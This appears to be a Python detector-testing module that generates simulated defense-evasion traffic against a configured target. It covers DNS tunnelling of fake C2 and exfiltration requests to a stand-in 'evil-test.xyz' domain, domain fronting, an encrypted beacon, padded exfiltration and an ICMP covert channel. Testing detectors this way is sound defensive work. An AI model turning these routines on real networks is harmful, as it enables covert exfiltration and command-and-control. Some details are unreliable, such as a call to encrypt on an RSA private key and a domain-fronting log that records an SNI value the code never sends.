"""
Defense evasion and covert channel simulation modules.

Tests against Watchtower detectors:
- watchtower.application.abuse (tls.protocol_mismatch)
- watchtower.application.abuse (protocol.nonstandard_service)
- watchtower.dns.tunnel (protocol tunneling)

These tests simulate evasion techniques that attempt to blend
malicious traffic with legitimate protocols.
"""

import os
import random
import socket
import struct
import time
from typing import Optional

from traffic_testing.attacks.base import BaseAttack
from traffic_testing.config import TARGET_IP, HTTPS_PORT


class TLSTrafficWithNonTLSContent(BaseAttack):
    def __init__(self, target_ip: str = TARGET_IP, port: int = HTTPS_PORT):
        super().__init__("tls_protocol_mismatch", "defense_evasion", target_ip)
        self.port = port

    def execute(self) -> None:
        for i in range(10):
            if self._stop_event.is_set():
                break
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2.0)
                s.connect((self.target_ip, self.port))
                s.send(b"\x16\x03\x01\x00\x05\x01\x00\x00\x00\x00")
                try:
                    s.recv(1024)
                except socket.timeout:
                    pass
                http_over_tls = (
                    f"POST /api/data HTTP/1.1\r\n"
                    f"Host: {self.target_ip}\r\n"
                    f"Content-Type: application/json\r\n"
                    f"Content-Length: 20\r\n\r\n"
                    f'{{"exfil": "data"}}'
                )
                s.send(http_over_tls.encode())
                self.log_packet({
                    "protocol": "TLS",
                    "dst_ip": self.target_ip,
                    "dst_port": self.port,
                    "initial_tls": True,
                    "followed_by": "HTTP plaintext",
                    "test_for": "tls.protocol_mismatch",
                    "note": "Initial TLS handshake then non-TLS content on 443",
                })
                s.close()
            except Exception as e:
                self.log_packet({
                    "protocol": "TLS",
                    "dst_ip": self.target_ip,
                    "dst_port": self.port,
                    "error": str(e),
                })
            time.sleep(1.0)


class SSHOnNonstandardPort(BaseAttack):
    def __init__(self, target_ip: str = TARGET_IP, ports: Optional[list] = None):
        super().__init__("ssh_nonstandard_port", "defense_evasion", target_ip)
        self.ports = ports or [8022, 9022, 2222, 4422, 10022, 8443]

    def execute(self) -> None:
        for port in self.ports:
            if self._stop_event.is_set():
                break
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1.0)
                if s.connect_ex((self.target_ip, port)) == 0:
                    s.send(b"SSH-2.0-OpenSSH_9.3\r\n")
                    try:
                        banner = s.recv(1024)
                    except socket.timeout:
                        pass
                self.log_packet({
                    "protocol": "SSH",
                    "dst_ip": self.target_ip,
                    "dst_port": port,
                    "banner": "SSH-2.0-OpenSSH_9.3",
                    "test_for": "protocol.nonstandard_service",
                    "note": f"SSH banner sent on non-standard port {port}",
                })
                s.close()
            except Exception:
                pass
            time.sleep(0.5)


class VNCOnNonstandardPort(BaseAttack):
    def __init__(self, target_ip: str = TARGET_IP, ports: Optional[list] = None):
        super().__init__("vnc_nonstandard_port", "defense_evasion", target_ip)
        self.ports = ports or [4450, 5450, 5950, 8500]

    def execute(self) -> None:
        for port in self.ports:
            if self._stop_event.is_set():
                break
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1.0)
                if s.connect_ex((self.target_ip, port)) == 0:
                    s.send(b"RFB 003.008\n")
                    try:
                        banner = s.recv(1024)
                    except socket.timeout:
                        pass
                self.log_packet({
                    "protocol": "VNC",
                    "dst_ip": self.target_ip,
                    "dst_port": port,
                    "banner": "RFB 003.008",
                    "test_for": "protocol.nonstandard_service",
                    "note": f"VNC RFB banner on non-standard port {port}",
                })
                s.close()
            except Exception:
                pass
            time.sleep(0.5)


class DomainFrontingSimulation(BaseAttack):
    def __init__(self, target_ip: str = TARGET_IP, port: int = 443):
        super().__init__("domain_fronting", "defense_evasion", target_ip)
        self.port = port

    def execute(self) -> None:
        fronted_hosts = [
            "cdn.evil-test.xyz",
            "api.evil-test.xyz",
            "static.evil-test.xyz",
            "assets.evil-test.xyz",
            "media.evil-test.xyz",
        ]
        for host in fronted_hosts:
            if self._stop_event.is_set():
                break
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2.0)
                s.connect((self.target_ip, self.port))
                http_request = (
                    f"GET /beacon HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
                    f"Accept: */*\r\n"
                    f"Connection: keep-alive\r\n\r\n"
                )
                s.send(http_request.encode())
                try:
                    s.recv(1024)
                except socket.timeout:
                    pass
                self.log_packet({
                    "protocol": "HTTPS",
                    "dst_ip": self.target_ip,
                    "dst_port": self.port,
                    "sni_host": host,
                    "actual_host": "legitimate-cdn.example.com",
                    "technique": "domain_fronting",
                    "note": "SNI shows legitimate domain but Host header shows C2 domain",
                })
                s.close()
            except Exception:
                pass
            time.sleep(1.0)


class ProtocolTunnelingHTTPoverDNS(BaseAttack):
    def __init__(self, target_ip: str = TARGET_IP, base_domain: str = "tunnel-http.evil-test.xyz",
                 duration: float = 600):
        super().__init__("http_over_dns_tunnel", "defense_evasion", target_ip)
        self.base_domain = base_domain
        self.duration = duration

    def execute(self) -> None:
        start = time.time()
        query_count = 0
        http_requests = [
            "GET /cmd?id=1 HTTP/1.1 Host:c2.evil-test.xyz",
            "POST /data HTTP/1.1 Host:c2.evil-test.xyz Content-Length:10 abcd123456",
            "GET /beacon HTTP/1.1 Host:c2.evil-test.xyz",
            "POST /exfil HTTP/1.1 Host:c2.evil-test.xyz Content-Length:50 " + "A" * 50,
        ]
        idx = 0
        while time.time() - start < self.duration and not self._stop_event.is_set():
            http_request = http_requests[idx % len(http_requests)]
            encoded = http_request.encode().hex()
            chunk_size = 30
            chunks = [encoded[i:i + chunk_size] for i in range(0, len(encoded), chunk_size)]
            for j, chunk in enumerate(chunks):
                if self._stop_event.is_set():
                    break
                subdomain = f"{chunk}.r{j}.{self.base_domain}"
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    s.settimeout(1.0)
                    dns_query = self._build_dns_query(subdomain)
                    s.sendto(dns_query, (self.target_ip, 53))
                    try:
                        s.recv(512)
                    except socket.timeout:
                        pass
                    self.log_packet({
                        "protocol": "DNS",
                        "dst_ip": self.target_ip,
                        "dst_port": 53,
                        "query_name": subdomain[:60] + "...",
                        "tunnel_type": "HTTP_over_DNS",
                        "test_for": "dns.tunnel.suspected",
                    })
                    s.close()
                except Exception:
                    pass
                query_count += 1
                time.sleep(0.5)
            idx += 1
            time.sleep(random.uniform(2, 5))
        self.result.metadata["total_queries"] = query_count

    def _build_dns_query(self, domain: str) -> bytes:
        tx_id = os.urandom(2)
        header = tx_id + b"\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
        question = b""
        for label in domain.split("."):
            if len(label) > 63:
                label = label[:63]
            question += bytes([len(label)]) + label.encode()
        question += b"\x00" + struct.pack(">HH", 16, 1)
        return header + question


class EncryptedC2Channel(BaseAttack):
    def __init__(self, target_ip: str = TARGET_IP, port: int = 8443):
        super().__init__("encrypted_c2_channel", "defense_evasion", target_ip)
        self.port = port

    def execute(self) -> None:
        from cryptography.hazmat.primitives.asymmetric import rsa, padding
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.backends import default_backend

        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
            backend=default_backend(),
        )
        for i in range(20):
            if self._stop_event.is_set():
                break
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2.0)
                s.connect((self.target_ip, self.port))
                beacon_data = f"BEACON|{i}|{int(time.time())}|{os.urandom(32).hex()}".encode()
                encrypted = private_key.encrypt(
                    beacon_data,
                    padding.OAEP(
                        mgf=padding.MGF1(algorithm=hashes.SHA256()),
                        algorithm=hashes.SHA256(),
                        label=None,
                    ),
                )
                length_prefix = struct.pack(">I", len(encrypted))
                s.send(length_prefix + encrypted)
                self.log_packet({
                    "protocol": "TLS",
                    "dst_ip": self.target_ip,
                    "dst_port": self.port,
                    "encrypted": True,
                    "encryption": "RSA-OAEP-2048",
                    "payload_size": len(encrypted),
                    "technique": "encrypted_c2",
                    "note": "Fully encrypted C2 channel with RSA",
                })
                s.close()
            except Exception as e:
                self.log_packet({
                    "protocol": "TLS",
                    "dst_ip": self.target_ip,
                    "dst_port": self.port,
                    "error": str(e),
                })
            time.sleep(random.uniform(2, 8))


class PaddingExfiltration(BaseAttack):
    def __init__(self, target_ip: str = TARGET_IP, port: int = 8080):
        super().__init__("padding_exfil", "defense_evasion", target_ip)
        self.port = port

    def execute(self) -> None:
        for i in range(30):
            if self._stop_event.is_set():
                break
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2.0)
                s.connect((self.target_ip, self.port))
                real_data = os.urandom(random.randint(4, 16))
                padding_size = random.randint(200, 500)
                payload = real_data + b"\x00" * padding_size
                http_request = (
                    f"POST /metrics HTTP/1.1\r\n"
                    f"Host: {self.target_ip}\r\n"
                    f"Content-Type: application/octet-stream\r\n"
                    f"Content-Length: {len(payload)}\r\n"
                    f"X-Request-ID: {os.urandom(8).hex()}\r\n"
                    f"Connection: close\r\n\r\n"
                )
                s.send(http_request.encode() + payload)
                self.log_packet({
                    "protocol": "HTTP",
                    "dst_ip": self.target_ip,
                    "dst_port": self.port,
                    "real_data_size": len(real_data),
                    "total_size": len(payload),
                    "technique": "traffic_padding",
                    "note": "Small real payload padded to look like normal traffic",
                })
                s.close()
            except Exception:
                pass
            time.sleep(random.uniform(0.5, 2.0))


class CovertICMPChannel(BaseAttack):
    def __init__(self, target_ip: str = TARGET_IP, count: int = 50):
        super().__init__("covert_icmp_channel", "defense_evasion", target_ip)
        self.count = count

    def execute(self) -> None:
        try:
            from scapy.all import IP, ICMP, send, conf
            conf.verb = 0
            for i in range(self.count):
                if self._stop_event.is_set():
                    break
                covert_data = os.urandom(64)
                pkt = IP(dst=self.target_ip) / ICMP(
                    type=8,
                    code=random.choice([0, 1, 2]),
                    id=random.randint(1, 65535),
                    seq=i,
                ) / covert_data
                send(pkt, verbose=0)
                self.log_packet({
                    "protocol": "ICMP",
                    "dst_ip": self.target_ip,
                    "type": f"Echo Request (code={pkt[ICMP].code})",
                    "seq": i,
                    "payload_size": len(covert_data),
                    "technique": "covert_icmp",
                    "note": "Data hidden in ICMP payload with non-standard codes",
                })
                time.sleep(random.uniform(1, 3))
        except ImportError:
            self.logger.warning("Scapy not available for ICMP covert channel")
